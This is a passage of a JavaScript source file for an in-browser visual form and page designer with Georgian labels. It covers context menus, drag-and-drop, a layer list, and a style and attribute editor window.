	this.layerItemPrefix="layerItem"+this.ObjectCounter+"_";
	
	
	this.debug=0;
	this.callBack=null;
	this.onChange="";
	this.dataType="json";
	this.ChangeLogLines={};
	
	var xChange,vUrl,vCallBack,vDataType,vDef,vName;
	
	this.style={"width":200,"height":300};
	this.classWindow="";
	this.classRightMenu="";
	this.rightMenu=null;
	
	this.menuObjectFuncs=new Array();
	this.menuObjectFuncs.push({'for':'*','title':'ახალი-ობიექტი','attributes':[],'callback':'LI.onclick=function(){/*initvar*/;local.createObject(target);}','filter':function(vPar){return true;}});
	this.menuObjectFuncs.push({'for':'*','tag':'hr'});
	this.menuObjectFuncs.push({'for':'body','title':'უკუ-სვლა','attributes':[],'callback':'LI.onclick=function(){window.history.back();}','filter':function(vPar){return true;}});
	this.menuObjectFuncs.push({'for':'body','title':'წინ-სვლა','attributes':[],'callback':'LI.onclick=function(){window.history.forward();}','filter':function(vPar){return true;}});
	this.menuObjectFuncs.push({'for':'body','title':'გადატვირთვა','attributes':[],'callback':'LI.onclick=function(){window.location.reload();}','filter':function(vPar){return true;}});
	this.menuObjectFuncs.push({'for':'body','tag':'hr'});
	
	this.menuObjectFuncs.push({'for':'*','title':'მოძრაობა','attributes':[],'callback':'LI.onclick=function(){/*initvar*/;local.moveObject(target);}','filter':function(vPar){return true;}});
	this.menuObjectFuncs.push({'for':'*','title':'ცვლილება','attributes':[],'callback':'LI.onclick=function(){/*initvar*/;local.editObject(target);}','filter':function(vPar){return true;}});
	this.menuObjectFuncs.push({'for':'*','title':'ობიექტი შესახებ','attributes':{},'callback':'LI.onclick=function(){/*initvar*/;local.aboutObject(target);}','filter':function(vPar){return true;}});
	this.menuObjectFuncs.push({'for':'svg','tag':'hr'});
	this.menuObjectFuncs.push({'for':'svg','title':'SVG to Image','attributes':{},'callback':'LI.onclick=function(){/*initvar*/;local.drawInlineSVG();}','filter':function(vPar){return true;}});
	this.menuObjectFuncs.push({'for':'div','tag':'hr'});
	this.menuObjectFuncs.push({'for':'div','title':'Save as MVG','attributes':{},'callback':'LI.onclick=function(){/*initvar*/;local.doInlineSave();}','filter':function(vPar){return true;}});	
	this.menuObjectFuncs.push({'for':'div','tag':'hr'});
	this.menuObjectFuncs.push({'for':'div','title':'Desk to Image','attributes':{},'callback':'LI.onclick=function(){/*initvar*/;local.drawInlineDIV();}','filter':function(vPar){return true;}});	
	this.menuObjectFuncs.push({'for':'div','title':'Download MVG','attributes':{},'callback':'LI.onclick=function(){/*initvar*/;local.doInlineSave(null,null,"mvg");}','filter':function(vPar){return true;}});	
	this.menuObjectFuncs.push({'for':'div','title':'Clear','attributes':{},'callback':'LI.onclick=function(){/*initvar*/;local.doInlineClear();}','filter':function(vPar){return true;}});	
	if(this.helperId){
		this.menuObjectFuncs.push({'for':'*','tag':'hr'});
		this.menuObjectFuncs.push({'for':'*','title':'დახმარება','attributes':{'onclick':'{var o=document.getElementById("'+this.helperId+'");if(o)o.style.display="inline-block";}'},'filter':function(vPar){return true;}});
	}
	
	this.tagsDragAndDrop=["div","span","a","b","i","fieldset","form","table","tr","td","th","ul","li","ol"];
	this.lang={"width":"სიგანე","height":"სიმაღლე","min-width":"მინ-სიგანე","min-height":"მინ-სიმაღლე","max-width":"მაქს-სიგანე","max-height":"მაქს-სიმაღლე","left":"სწორება მარცხნივ","top":"სწორება ზემოთ","right":"სწორება მარჯვნივ","bottom":"სწორება ქვემოთ","position":"პოზიცია","display":"ეკრანიზება",
	"absolute":"აფსოლიტური","relative":"რელაციური - დაკავშირებული","static":"სტატიკური","fixed":"ფიქსირებული","inline":"შეძლებისდაგვარი","inline-block":"ბლოკისებური","block":"სრული ბლოკი","none":"არ არის","table":"ცხრილი","table-row":"სტრიქონი","table-cell":"სვეტი","flex":"სრული ფლექსი","inline-flex":"ხაზში ფლექსი",
						"border-left-color":"მარცხენა საზღვრის ფერი","border-left-style":"მარცხენა საზღვრის სტილი","border-left-width":"მარცხენა საზღვრის სისქე",
						"border-right-color":"მარჯვენა საზღვრის ფერი","border-right-style":"მარჯვენა საზღვრის სტილი","border-right-width":"მარჯვენა საზღვრის სისქე",
						"border-top-color":"ზედა საზღვრის ფერი","border-top-style":"ზედა საზღვრის სტილი","border-top-width":"ზედა საზღვრის სისქე",
						"border-bottom-color":"ქვედა საზღვრის ფერი","border-bottom-style":"ქვედა საზღვრის სტილი","border-bottom-width":"ქვედა საზღვრის სისქე",
						"border-radius":"წახნაგის სიგლუვე",
						"background-color":"ფონის ფერი",
						"background-image":"ფონის სურათი",
						"background-repeat":"ფონის განმეორება",
						"background-position":"ფონის პოზიცია",
						"background-size":"ფონის ზომები",
						"color":"ფონტის ფერი",
						"font-family":"ფონტი",
						"font-size":"ფონტის ზომა",
						"font-style":"ფონტის სტილი",
						"font-weight":"ფონტის სისქე",
						"text-decoration":"ტექხტის დეკორაცია",
						"text-align":"ჰორიზონტალური სწორება",
						"vertical-align":"ვერტიკალური სწორება"

	};
	this.T=function T(idx){if(!idx)return idx;idx=String(idx).toLowerCase();if(idx in local.lang)return local.lang[idx];return idx;}
	
	
	
	
	if(this.parent && this.parent!=window)
	{
		if(this.parent.getAttribute("data-debug"))this.debug=this.parent.getAttribute("data-debug");
		
		if(!xChange)
		if(this.parent.getAttribute("data-onchange"))xChange=this.parent.getAttribute("data-onchange");

		if(!vUrl)
		if(this.parent.getAttribute("data-url"))vUrl=this.parent.getAttribute("data-url");
		
		if(!vCallBack)
		if(this.parent.getAttribute("data-callback"))vCallBack=this.parent.getAttribute("data-callback");
				
		if(!vDataType)
		if(this.parent.getAttribute("data-type"))vDataType=this.parent.getAttribute("data-type");
		
		if(!vDef)
		if(this.parent.getAttribute("value"))vDef=this.parent.getAttribute("value");
		if(!vDef)
		if(this.parent.getAttribute("data-value"))vDef=this.parent.getAttribute("data-value");
		
		if(!vName)
		if(this.parent.getAttribute("name"))vName=this.parent.getAttribute("name");
		if(!vName)
		if(this.parent.getAttribute("data-name"))vName=this.parent.getAttribute("data-name");
	
		if(this.parent.getAttribute("data-class-window"))this.classWindow=this.parent.getAttribute("data-class-window");
		if(this.parent.getAttribute("data-class-rightmenu"))this.classRightMenu=this.parent.getAttribute("data-class-rightmenu");
		
		if(this.parent.getAttribute("data-storageItemName"))this.storageItemName=this.parent.getAttribute("data-storageItemName");
		
		if(this.parent.getAttribute("data-canvasid")){
			this.canvasId=this.parent.getAttribute("data-canvasid");
			this.canvasElement=document.getElementById(this.canvasId);
			this.ctx = this.canvasElement.getContext("2d");
		}
		
		
	
		if(!vName)vName=this.myObjectId;
		this.name=vName;
		if(!this.name)this.name=this.ParentID;
		this.value=vDef;
		this.onChange=xChange;
		
		xFormDesigners[this.ObjectCounter]=this;
		if(this.name)xFormDesignersById[this.name]=this;
	}else
	if(this.parent==window)
	{
		xFormDesigners[this.ObjectCounter]=this;
		if(this.name)xFormDesignersById[this.name]=this;
	}

this.formAsyncPurpose=document.getElementById(local.formAsyncId);
if(!this.formAsyncPurpose || this.formAsyncPurpose==null || this.formAsyncPurpose==undefined){
	this.formAsyncPurpose=document.createElement("form");
	/*პანელის განთავსება*/
	this.formAsyncPurpose.id=local.formAsyncId;
	this.formAsyncPurpose.className="formAsync";
	this.formAsyncPurpose.setAttribute("METHOD","POST");
	this.formAsyncPurpose.setAttribute("Action","?phpParam=content_downloader&utf8=y");
}



this.toolBox=document.getElementById("formDesignerToolBox");
if(!this.toolBox || this.toolBox==null || this.toolBox==undefined){
	this.toolBox=document.createElement("div");
	this.statusBar=document.createElement("div");
	this.toolBox.appendChild(this.statusBar);
	/*პანელის განთავსება*/
	this.toolBox.id="formDesignerToolBox";
	this.toolBox.className="toolBox";
	this.statusBar="formDesignerStatusBar";
	this.statusBar.className="statusBar";
}
this.layerBox=document.getElementById(local.layerBoxId);
if(!this.layerBox || this.layerBox==null || this.layerBox==undefined){
	this.layerBox=document.createElement("UL");
	/*პანელის განთავსება*/
	this.layerBox.id=local.layerBoxId;
	this.layerBox.className="layerBox drophere";
	
	AddEventOnObject(this.layerBox,"drop",local.handleDrop);
	AddEventOnObject(this.layerBox,"dragover",function(ev){
		ev=ev || window.event;
		ev.preventDefault();
		//console.log(dataTransfer.items);
	});
	
	AddEventOnObject(this.layerBox,"click",function(ev){
		var e=ev || window.event;
		if(this.getAttribute("data-show")!="hidden")
			this.setAttribute("data-show","hidden");
		else
			this.removeAttribute("data-show","hidden");		
	});
	

}


if(this.parent != null && this.parent != undefined){
	if(this.parent==window){
		document.body.appendChild(this.toolBox);
		document.body.appendChild(this.layerBox);
	}else{
		if(this.parent.parentElement){
			try{
			this.parent.parentElement.insertBefore(this.parent,this.toolBox);
			this.parent.parentElement.insertBefore(this.parent,this.layerBox);
			}catch(e){
				document.body.appendChild(this.toolBox);
				document.body.appendChild(this.layerBox);
			}
		
		}else{
			//this.parent.appendChild(this.toolBox);
			//this.parent.appendChild(this.layerBox);
			document.body.appendChild(this.toolBox);
			document.body.appendChild(this.layerBox);
			
		}
	}
}


this.init=function init(){
local.drawWindow();
/*ფორმის ინიციალიზაცია და ევენტების მიბმა*/
//AddEventOnObject(local.parent,"mousemove",local.onMouseMove);

//AddEventOnObject(local.parent,"dragstart",local.onMouseDragStart);
//AddEventOnObject(local.parent,"dragenter",local.onMouseDragEnter);
//AddEventOnObject(local.parent,"dragleave",local.onMouseDragLeave);
AddEventOnObject(local.parent,"dragover",local.onMouseDragOver);
AddEventOnObject(local.parent,"drop",local.onMouseDrop);
//AddEventOnObject(local.parent,"drag",local.onMouseDrag);
AddEventOnObject(local.parent,"mousedown",function(e){
		if (e == null)e = window.event;
		var target = e.target != null ? e.target : e.srcElement;
		var bl=RegExp(/^(\s*|.*\s+)(default)(\s+.*|\s*)$/gi).test(getClassName(target));
		if(bl)local.moveObject(target);
	});


AddEventByString(window,"click","xFormDesignersById['"+local.name+"'].onMouseMenu(event)");
AddEventOnObject(local.parent,"mouseup",local.onMouseMenu);


}

this.onMouseMove=function onMouseMove(e){
/*ელემენტზე მაუსის გაჩერებისას, უნდა გამოჩნდეს რომელ ობიექტზე დგას, კლასი რა აქვს და რედაქტირების შესაზლებლობა*/
}

this.onMouseDragStart=function onMouseDragStart(event){
	var ev=window.event || event;
	var target = ev.target != null ? ev.target : ev.srcElement;

	handleDragStart(ev);
	if(_dragElement =="object")local._DragSrcEl=_dragElement;else local._DragSrcEl=target;
console.log(local._DragSrcEl);	
/*ელემენტზე მაუსით ჩაჭიდვისას ობიექტი უნდა გადაიქცეს მამოძრავებელად და დაიწყოს მოძრაობა, ხოლო მაუსი სადაც გაჩერდება იმ წერტილად მოხდეს ჩავარდნა*/
	if(!ev.target.id){ev.target.id="formDesignDragDrop"+(formDesignDragDropCounter+1);formDesignDragDropCounter++;}
	ev.dataTransfer.setData("dragIdFormDesigner", ev.target.id);
}

this.onMouseDragEnter=function onMouseDragEnter(event){
	var ev=window.event || event;
	var target = ev.target != null ? ev.target : ev.srcElement;

/*drop--ის დროს როდესაც დავიწყებთ ობიექტზე მოძრაობისთვის*/
//console.log("Drag Enter: "+ev);
}
this.onMouseDragLeave=function onMouseDragLeave(event){
	var ev=window.event || event;
	var target = ev.target != null ? ev.target : ev.srcElement;
	var tag=String(target.tagName || target.nodeName).toLowerCase();

	if(local.tagsDragAndDrop.indexOf(tag)>=0)delClass(target,"onDragAndDrops");
	ev.dataTransfer.setData("dragIdFormDesigner", "");
/*drop--ის დროს როდესაც გადავატარებთ ობიექტს და გაცდება მის არეალს*/
//console.log("Drag Leave: "+ev);
	//ev.preventDefault();
}
this.onMouseDragOver=function onMouseDragOver(event){
	var ev=window.event || event;
	var target = ev.target != null ? ev.target : ev.srcElement;
	var tag=String(target.tagName || target.nodeName).toLowerCase();

	if(local.tagsDragAndDrop.indexOf(tag)>=0)addClass(target,"onDragAndDrops");
	
	OnMouseMove(ev);
/*drop--ის დროს როდესაც გადავატარებთ ობიექტს*/
//if(target.className)console.log("Drag Over: "+target.className);
	ev.preventDefault();
}

this.onMouseDrop=function onMouseDrop(event){
	var ev=window.event || event;
	var target = ev.target != null ? ev.target : ev.srcElement;
	var tag=String(target.tagName || target.nodeName).toLowerCase();
/*drop--ის დროს როდესაც ხელს აუშვებთ და ჩავაგდებთ*/
    var data = ev.dataTransfer.getData("dragIdFormDesigner");
	vGev=ev;
	var lx=vGev.layerX;
	var ly=vGev.layerX;

    if(document.getElementById(data))
	if(target.tagName)
	if(local.tagsDragAndDrop.indexOf(tag)>=0)
	{
		var obj=document.getElementById(data)
		try{
			//target.appendChild(obj);
			//local.stopObject(obj);
			//ev.preventDefault();
		}catch(e){console.log(e);}
	}
}

this.onMouseDrag=function onMouseDrag(event){
	var ev=window.event || event;
	var target = ev.target != null ? ev.target : ev.srcElement;
/*ელემენტზე მაუსით ჩაჭიდვისას ობიექტი უნდა გადაიქცეს მამოძრავებელად და დაიწყოს მოძრაობა, ხოლო მაუსი სადაც გაჩერდება იმ წერტილად მოხდეს ჩავარდნა*/
}

this.unselect=function unselect(){
	var els;
	try{els=local.parent.getElementsByClassName("choose");for(var ob1=0;ob1<els.length;ob1++){delClass(els[ob1],"choose");}}catch(e){};
	try{els=local.layerBox.getElementsByClassName("choose");for(var ob1=0;ob1<els.length;ob1++){delClass(els[ob1],"choose");}}catch(e){};
}

this.changeObjectId=function changeObjectId(o,n){
    var nwo=document.getElementById(n);
	if(nwo)return false;
	
	try{
	var owo=document.getElementById(o);
	owo.id=n;
	}catch(e){console.log(e);}
	
	try{
	var lyr=document.getElementById(local.layerItemPrefix+o);
	lyr.getElementsByTagName("A")[0].innerHTML=n;
	lyr.id=local.layerItemPrefix+n;
	lyr.setAttribute('data-handle-id',n);
	lyr.setAttribute('data-layer-id',lyr.id);
	}catch(e){console.log(e);}
	
	return true;
	
}

this.onMouseMenu=function onMouseMenu(event){
	var e=window.event || event;
	var target=e.target || e.srcElement;
	var button="";
	var els,ob1;
	
	var tso=target;
	while(tso && tso.getAttribute("data-mark")!="standard"){
		tso=tso.parentElement;
	}
		
	
/*მაუსის მარჯვენა ღილაკზე დაწკაპუნებისას მენიუს ჩამოშლა, რომლის ფუნქციონალი განისაზღვრება მასივით menuObjectFuncs*/  
	if (e.which == null){button = e.button;	} else {button = e.which;};//1 - left, 3 - right, 4 - middle

	if(button==3){
		var t=target;while(t && t!=local.parent){t=t.parentElement;}
		if(t!=local.parent)return;
		if(tso)local.drawMenu(tso);
		else local.drawMenu(target);
		if(e.preventDefault != undefined)e.preventDefault();
		if(e.stopPropagation != undefined)e.stopPropagation();	
	}else 
	if(button==1){
		local.closeMenu();
		
		if(tso){
			local.unselect();
			addClass(tso,"choose");
			if(tso.id.indexOf(local.layerItemPrefix)==0){
				try{addClass(document.getElementById(tso.id.substr(local.layerItemPrefix.length)),"choose");}catch(e){};
			}else
				try{addClass(document.getElementById(local.layerItemPrefix+tso.id),"choose");}catch(e){};
		}else {
			//if(e.preventDefault != undefined)e.preventDefault();
			//if(e.stopPropagation != undefined)e.stopPropagation();	
			return;
		}
	}else {
			local.unselect();
	}
}	
//----------------------------------------------------------------
this.drawMenu=function drawMenu(target){
	if(!local.rightMenuId)local.rightMenuId="formDesignerRightMenu";
	
	if(!document.getElementById(local.rightMenuId)){
		local.rightMenu=document.createElement("div");
		local.rightMenu.id=local.rightMenuId;
		local.rightMenu.className=local.rightMenuId+" "+local.classRightMenu+" rightMenu";
		if(local.parent.parentElement)
			local.parent.parentElement.insertBefore(local.rightMenu,local.parent);
		else
			document.body.appendChild(local.rightMenu);
	}else{
		local.rightMenu=document.getElementById(local.rightMenuId);
	}
	local.rightMenu.style.zIndex=20001;
	
	var UL=document.createElement("ul");
	for(var i=0;i<local.menuObjectFuncs.length;i++)
	if((!("for" in local.menuObjectFuncs[i])) || (local.menuObjectFuncs[i]["for"]=="*") || (local.menuObjectFuncs[i]["for"].toLowerCase()==target.tagName.toLowerCase()))
	{
		var LI;
		if("tag" in local.menuObjectFuncs[i])
			LI=document.createElement(local.menuObjectFuncs[i]["tag"]);
		else 
			LI=document.createElement("li");
		
		if("title" in local.menuObjectFuncs[i])LI.innerHTML=local.menuObjectFuncs[i]["title"];
		
		if("attributes" in local.menuObjectFuncs[i])
		{
			var attributes=local.menuObjectFuncs[i]["attributes"];
			if(typeof(attributes) == "object")for(var ky in attributes)LI.setAttribute(ky,attributes[ky]);
		}
		
		if("callback" in local.menuObjectFuncs[i])
		{
			var vCallBack=local.menuObjectFuncs[i]["callback"];
			var item=local.menuObjectFuncs[i];
			//console.log(vCallBack);
			if(vCallBack){
				vCallBack.replace("/*initvar*/",'var local,target;try{local=new jc_formDesigner("'+local.name+'");target=document.getElementById("'+target.id+'");while(target && target!=local.parent){target=target.parentElement;};}catch(e){console.log("formDesigner callback menu:"+e);}');
				eval(vCallBack);
			}
		}
		
		UL.appendChild(LI);
	}
	local.rightMenu.innerHTML="";
	local.rightMenu.appendChild(UL);
	local.rightMenu.style.display="inline-block";
	//console.log((MouseX-local.style["width"]-5)+" X "+local.style["width"]+"px");
	var lpos=(MouseX-local.style["width"]-5);
	var topy=MouseY+5;
	if(local.style["height"]<window.screen.availHeight)
		if((topy+local.style["height"])>window.screen.availHeight){
			topy=window.screen.availHeight-local.style["height"]-50;
		}
	
	local.rightMenu.style.left=(lpos>0?lpos:0)+"px";
	local.rightMenu.style.width=local.style["width"]+"px";
	local.rightMenu.style.top=topy+"px";
	local.rightMenu.style.height=local.style["height"]+"px";
	var sts=["border","padding","margin","background"];
	for(var k in sts)if(sts[k] in local.style)local.rightMenu.style[sts[k]]=local.style[sts[k]];
	
	if(target)
	{
		//console.log("target: "+(gt=target));
	}

}

//-------------------------------------------------
this.drawWindow=function drawWindow(){
	if(!local.WindowId)local.WindowId="formDesignerWindow";
	
	if(!document.getElementById(local.WindowId)){
		local.Window=document.createElement("div");
		local.Window.id=local.WindowId;
		local.Window.className=local.WindowId+" popupWindow "+local.classWindow+" drag";
		local.Window.style.zIndex=30001;
		
		local.wHead=document.createElement("div");
		local.wHead.className="wHead";
		
		local.wBody=document.createElement("div");
		local.wBody.className="wBody stopdrag";
		local.wBody.style=local.wBody.style.clientHeight;
		
		
		local.wTitle=document.createElement("div");
		local.wTitle.className="wTitle";
		
		local.wMinz=document.createElement("div");
		local.wMinz.className="wMinz";
		local.wMinz.innerHTML="[-]";
	

		local.wClose=document.createElement("div");
		local.wClose.className="wClose";
		local.wClose.innerHTML="X";
		
		//local.wClose.onclick=function(){document.getElementById(local.WindowId).style.display="none";};
		AddEventByString(local.wClose,"click",'document.getElementById("'+local.WindowId+'").style.display="none";');
		AddEventByString(local.wMinz,"click",'{var vl="400px !important";var ob=document.getElementById("'+local.WindowId+'");if(ob.style.width.toLowerCase()!=vl.toLowerCase())ob.style.width=vl;}else ob.style.width="";');
		
		
		local.wHead.appendChild(local.wTitle);
		//local.wHead.appendChild(local.wMinz);
		local.wHead.appendChild(local.wClose);
		local.Window.appendChild(local.wHead);
		local.Window.appendChild(local.wBody);
		
		document.body.appendChild(local.Window);
		
		
	}else{
		local.Window=document.getElementById(local.WindowId);
	}

}

//-------------------------------------------------
this.aboutObject=function aboutObject(o){
	var bHtml="";
	local.drawWindow();
	
	bHtml+="<div class='attributesBlock'>";
	if(o.id)bHtml+="<div><b>Id:</b><span>"+o.id+"</span></div>";
	if(o.className)bHtml+="<div><b>Id:</b><span>"+o.className+"</span></div>";
	bHtml+="<hr>";
	for(var i=0;i<o.attributes.length;i++)
	{
		bHtml+="<div><b>"+o.attributes[i].name+":</b><input value='"+o.attributes[i].value+"'></div>";
	}
	bHtml+="<hr>";
	
	
	var computedStyle;
	if (window.getComputedStyle) {
		computedStyle = getComputedStyle(o, null);
	} else {
		computedStyle = o.currentStyle
	}
	
	var st=o.style;
	for(var x in st)
	if((x != "cssText")&&(x != "all")&&(typeof(x)=="string"))
	{
		bHtml+="<div><b>"+x+":&nbsp;</b><span class='editable' contenteditable='true' >"+computedStyle[x]+"</span></div>";
	}
	
	bHtml+="</div>";
	local.wBody.innerHTML=bHtml;
	local.Window.style.display="inline-block";
}
//-------------------------------------------------
this.addChangeLog=function addChangeLog(str)
{
	var cid=local.WindowId+"ChangeLogId";
	var cobj=document.getElementById(cid);
	if(cobj)
	{
		cobj.innerHTML+=";\r\n"+str;
	}

}
//-------------------------------------------------
this.cssToJsName=function cssToJsName(nm)
{
	var ns=nm.split("-");
	var ret=ns[0];
	for(var i=1;i<ns.length;i++)
		ret+=String(ns[i][0]).toUpperCase()+String(ns[i]).substr(1);
		
	return ret;
}
//-------------------------------------------------
this.addChangeByInputEvent=function addChangeByInputEvent(obid,par,isAttr)
{
	var str='';
	if(isAttr=='changeid'){
		str='try{local.changeObjectId("'+obid+'","'+par.value+'");}catch(e){console.log("'+obid+'"+": "+"'+par.name+'"+"="+"'+par.value+'"+" "+e);};';
	}
	else
	if(isAttr){
		str='try{document.getElementById("'+obid+'").setAttribute("'+(par.name)+'","'+par.value+'");}catch(e){console.log("'+obid+'"+": "+"'+par.name+'"+"="+"'+par.value+'"+" "+e);};';
	}else{
		str='try{document.getElementById("'+obid+'").style.'+local.cssToJsName(par.name)+'="'+par.value+'";}catch(e){console.log(e);};';
	}
	if(!local.ChangeLogLines)local.ChangeLogLines={};
	if(par.name)local.ChangeLogLines[par.name]=str;
	//console.log(local.ChangeLogLines);
	local.addChangeLog(str);
}
//-------------------------------------------------
this.refreshChangeLog=function refreshChangeLog()
{
	var cid=local.WindowId+"ChangeLogId";
	var cobj=document.getElementById(cid);
	if(cobj && local.ChangeLogLines)
	{
		cobj.innerHTML="";
		for(var k in local.ChangeLogLines)
		{
			cobj.innerHTML+=local.ChangeLogLines[k]+";\r\n";
		}
	}
	
}
//-------------------------------------------------
this.saveEditedForm=function saveEditedForm()
{
	EditPanelSync();
	local.selectedObject.innerHTML=local.contentEditor.Value();
	if(local.selectedObject.tagName.toLowerCase()!=local.tagListHtml.value.toLowerCase())
		if(local.selectedObject.id){
			var svd=local;
			local.parent=changeTag(document.getElementById(local.selectedObject.id),local.tagListHtml.value);
			//console.log(local.selectedObject.id+"==="+local.parent.id);
			if(local.selectedObject.id==local.parent.id){
				local=new jc_formDesigner(local.parent.id,local.helperId);
				local.copyVariables(svd);
			}
		}

	if(local.ChangeLogLines)for(var t in local.ChangeLogLines)eval(local.ChangeLogLines[t]);
	document.getElementById(local.WindowId).style.display="none";
}
//-------------------------------------------------
this.generateNewId=function generateNewId(){
	var nid,nob="start";
	while(nob){
		nid="formDesignEditTempo"+(formDesignEditTempoCounter++);
		nob=document.getElementById(nid);
	}
	return nid;
}
//-------------------------------------------------
this.editObject=function editObject(o){
	var bHtml="";
	local.drawWindow();
	local.wBody.innerHTML="";
	local.wTitle.innerHTML="";
	
	if(!o.id)o.id=local.generateNewId();
	local.selectedObject=o;
	
	local.oTextAreaId=local.WindowId+"_textarea";
	if(!(local.oTextArea=document.getElementById(local.oTextAreaId))){	
		local.oTextArea=document.createElement("textarea");
		local.oTextArea.id=local.oTextAreaId;
	};
	local.oTextArea.value=o.innerHTML;
	//console.log(local.oTextArea.value);
	
	var computedStyle;
	if (window.getComputedStyle) {
		computedStyle = getComputedStyle(o, null);
	} else {
		computedStyle = o.currentStyle;
	}	
	
	var bFuncs=document.createElement("div");
	bFuncs.className="blockFunction";
	
	var bSave=document.createElement("div");
	bSave.className="button";
	bSave.innerHTML="Save";
	AddEventOnObject(bSave,"click",local.saveEditedForm);
	
	var bCancel=document.createElement("div");
	bCancel.className="button";
	bCancel.innerHTML="Cancel";
	AddEventByString(bCancel,"click",'document.getElementById("'+local.WindowId+'").style.display="none";');
	
	bFuncs.appendChild(bSave);
	bFuncs.appendChild(bCancel);
	local.wTitle.appendChild(bFuncs);
	
	var prametersGroups=[];
	
	if(["rect","circle","ellipse","line","polyline","polygon","path","text"].indexOf(o.tagName.toLowerCase())>=0){
		prametersGroups=[
		{"name":"Layout and Position",
		"attributes":local.svgTagsParams[o.tagName.toLowerCase()]
		},
		{"name":"Background",
		"attributes":[		"background-color",
							"background-image",
							"background-repeat",
							"background-attachment",
							"background-position",
							"background-size",
							"background-origin",
							"background-clip"
						],
		"styleParamValues":{
			"background-color":{"type":"color"},
			"background-repeat":{"type":"select","show":"border-width:1px;border-color:grey;margin:2px;","data":["none","no-repeat","repeat-x","repeat-y"]}
			}
		}		
		];
		

	}else
	{
		prametersGroups=[
		{"name":"Layout and Position",
		"styleParams":["width","height","min-width","min-height","max-width","max-height","left","top","right","bottom","position","display","overflow","box-sizing"],
		"styleParamValues":{
			"position":{"type":"select","data":["absolute","relative","static","fixed"]},
			"display":{"type":"select","data":["inline","inline-block","block","none","table","table-row","table-cell","flex","inline-flex"]},
			"overflow":{"type":"select","data":["auto","hidden","visible","scroll","unset","inherit","initial"]},
			"box-sizing":{"type":"select","data":["border-box","content-box","unset","inherit","initial"]}
			}
		},
		{"name":"Border",
		"styleParams":[	"border-left-width","border-left-color","border-left-style","br",
							"border-right-width","border-right-color","border-right-style","br",
							"border-top-width","border-top-color","border-top-style","br",
							"border-bottom-width","border-bottom-color","border-bottom-style","br",
							"border-radius","hr"
						],
		"styleParamValues":{
			"border-left-style":{"type":"select","show":"border-width:1px;border-color:grey;margin:2px;","data":["none","dotted","dashed","solid","double","groove","ridge","inset","outset"]},
			"border-right-style":{"type":"select","show":"border-width:1px;border-color:grey;margin:2px;","data":["none","dotted","dashed","solid","double","groove","ridge","inset","outset"]},
			"border-top-style":{"type":"select","show":"border-width:1px;border-color:grey;margin:2px;","data":["none","dotted","dashed","solid","double","groove","ridge","inset","outset"]},
			"border-bottom-style":{"type":"select","show":"border-width:1px;border-color:grey;margin:2px;","data":["none","dotted","dashed","solid","double","groove","ridge","inset","outset"]},
			"border-radius":{"placeholder":"Radius size: 1px, 1% etc"}
			}
		},
		{"name":"Padding",
		"styleParams":[	"padding-top","padding-right","padding-bottom","padding-left"],
		"styleParamValues":{}
		},
		{"name":"Background",
		"styleParams":[		
							"background-image",
							"background-color",
							"background-repeat",
							"background-attachment",
							"background-position",
							"background-size",
							"background-origin",
							"background-clip",
							"background-blend-mode"
						],
		"styleParamValues":{
			"background-image":{"type":"text","block":"display:block;width:100%;","show":"display:block;width:100%;box-sizing:border-box;padding:2px;"},
			"background-color":{"type":"color"},
			"background-repeat":{"type":"select","show":"border-width:1px;border-color:grey;margin:2px;","data":["none","no-repeat","repeat-x","repeat-y"]},
			"background-blend-mode":{"type":"select","show":"margin:2px;","data":["normal","multiply","screen","overlay","darken","lighten","color-dodge","saturation","color","luminosity"]}
			}
		},
		{"name":"Fonts",
		"styleParams":[	
							"color",
							"font-family",
							"font-size",
							"font-style",
							"font-variant",
							"font-weight",
							"text-decoration",
							"text-align",
							"vertical-align"
							
							
						],
		"styleParamValues":{
			"font-family":{"type":"select","data":["Sylfaen","Arial","Tahoma","Windings","Windings2","Windings3"]},
			"font-style":{"type":"select","data":["normal","italic","oblique"]},
			"font-variant":{"type":"select","data":["normal","small-caps"]},
			"font-weight":{"type":"select","data":["normal","bold"]},
			"text-decoration":{"type":"select","data":["none","undrline"]},
			"text-align":{"type":"select","data":["left","center","right"]},
			"vertical-align":{"type":"select","data":["top","middle","bottom"]},
			"text-decoration":{"type":"select","data":["none","overline","underline","line-through"]},
			"color":{"type":"color"}
			}
		}];
	}

	
	var aBlock=document.createElement("div");
	aBlock.className="attributesBlock";
	local.wBody.appendChild(aBlock);
	
	var TabIndex=1;
	var Tabs=document.createElement("div");
	Tabs.className="tabs";
	aBlock.appendChild(Tabs);
	
	
	var Tab=document.createElement("div");
	Tab.className="tab";
	var TabInput=document.createElement("input");
		TabInput.type="radio";
		TabInput.id="tab-"+TabIndex;
		TabInput.name="tab-group-1";
		TabInput.checked=true;
	var TabLabel=document.createElement("label");
		TabLabel.setAttribute("for","tab-"+TabIndex);
		TabLabel.innerHTML="Content";
	var TabContent=document.createElement("div");
		TabContent.className="content";
		
		var tagTypeListDIV=["DIV","SPAN","B","I","U","UL","LI","OL"];
		var tagTypeListSVG=["CIRCLE","RECT","ELLIPSE","LINE","POLYLINE","POLYGON","PATH","TEXT"];
		var tagTypeList=["DIV","SPAN","B","I","U","UL","LI","OL","CIRCLE","RECT","ELLIPSE","LINE","POLYLINE","POLYGON","PATH","TEXT"];
		try{
			if(o.id==local.parent.id)tagTypeList=["DIV","SVG"];
			else
			if(local.parent.tagName=="DIV")tagTypeList=tagTypeListDIV;
			else
			if(local.parent.tagName=="SVG")tagTypeList=tagTypeListSVG;
		}catch(e){};

		
		local.tagListHtml=document.createElement("SELECT");
		for(var i=0;i<tagTypeList.length;i++){
			var tagOpt=document.createElement("OPTION");
			tagOpt.value=tagOpt.innerHTML=tagTypeList[i];
			if(tagTypeList[i].toUpperCase()==o.tagName.toUpperCase()){tagOpt.setAttribute("selected","true");}
			local.tagListHtml.appendChild(tagOpt);
		}
		local.tagListHtml.value=o.tagName.toUpperCase();
		TabContent.appendChild(local.tagListHtml);

		
	local.objectTitle=document.createElement("input");
	local.objectTitle.type="text";
	local.objectTitle.className="";
	local.objectTitle.name="layerTitleObject";
	var lid=document.getElementById(local.layerItemPrefix+o.id);
	var lida="Haven't layer",lctr=lida;
	try{lida=lid.getElementsByTagName("A")[0].innerHTML;}catch(e){};

	local.objectTitle.value=lida;
	TabContent.appendChild(local.objectTitle);
	
	if(lctr!=lida)AddEventByString(local.objectTitle,"change","new jc_formDesigner().xGet(\""+local.name+"\").addChangeByInputEvent(\""+o.id+"\",this,'changeid')");
	
	TabContent.appendChild(local.oTextArea);
	
	
	local.contentEditor=new EditPanel(local.oTextArea);

	Tab.appendChild(TabInput);
	Tab.appendChild(TabLabel);
	Tab.appendChild(TabContent);
	Tabs.appendChild(Tab);
